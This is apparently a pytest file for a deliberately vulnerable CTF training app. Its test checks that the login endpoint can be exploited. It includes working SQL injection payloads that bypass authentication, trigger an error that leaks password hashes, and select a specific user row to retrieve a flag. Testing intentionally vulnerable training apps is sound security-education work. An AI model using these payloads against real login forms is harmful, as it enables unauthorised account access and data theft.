import pytest
import os, json
from app.account.models import User
from app import db_seed
from app import create_app ,db

mimetype = 'application/json'
headers = {
    'Content-Type': mimetype
}

old_set = User.set_password
old_verify = User.verify_password

@pytest.fixture
def app():
    app = create_app('sqliauthbypass')
    app.config.update({
        "TESTING": True,
    })

    yield app

@pytest.fixture()
def client(app):
    return app.test_client()

def setup_function():
    app = create_app('sqliauthbypass')
    with app.app_context():
        db.session.commit()
        db.drop_all()
        db.create_all()
        db_seed()
        from app.challenge.sqliauthbypass import seed
        seed(app)
    return app
  
def teardown_function():
    User.set_password = old_set
    User.verify_password = old_verify
    os.remove('app.db')

class TestChallengeClass:    
  @classmethod
  def setup_class(self):
    app = setup_function()
    with app.app_context():
        User.insert_admin("admin","password")
        User.insert_user("user","password")
  @classmethod
  def teardown_class(self):
    teardown_function()

  def post_json(self,client, url ,data):
    return client.post(url, data=json.dumps(data), headers=headers)
  
  def put_json(self,client, url ,data):
    return client.put(url, data=json.dumps(data), headers=headers)

  def login_as_user(self, client):
    self.post_json(client,"/api/v1/auth/login",{"login": "user", "password": "password"})

  def logout(self, client):
    client.get("/api/v1/auth/logout")

  def login_as_admin(self, client):
    self.post_json(client,"/api/v1/auth/login",{"login": "admin", "password": "password"})

  def test_challenge_is_exploitable(self,client,app):
    os.environ['FLAG'] = "ThisIsMyFlag"
    db.session.commit()
    db.drop_all()
    db.create_all()
    db_seed()
    User.insert_user("user","password")
    from app.challenge.sqliauthbypass import seed
    seed(app)
    assert self.post_json(client,"/api/v1/auth/login",{"login": "user", "password": "password"}).json['status'] == "success"
    self.post_json(client, "/api/v1/auth/login", {"login":'" OR 1=1 --a', "password":"test"}).json['status'] == "success"
    login = client.get("/api/v1/user/profile")
    assert login.status_code == 200
    assert client.get("/api/v1/flag").status_code == 401

    assert "password_hash=" in self.post_json(client, "/api/v1/auth/login", {"login":'" ', "password":"test"}).json['message']
    self.post_json(client, "/api/v1/auth/login", {"login":'" OR 1=1 LIMIT 1 OFFSET 3 --a', "password":"test"}).json['status'] == "success"
    assert client.get("/api/v1/flag").status_code == 200
    assert client.get("/api/v1/flag").json['message'] == "ThisIsMyFlag"
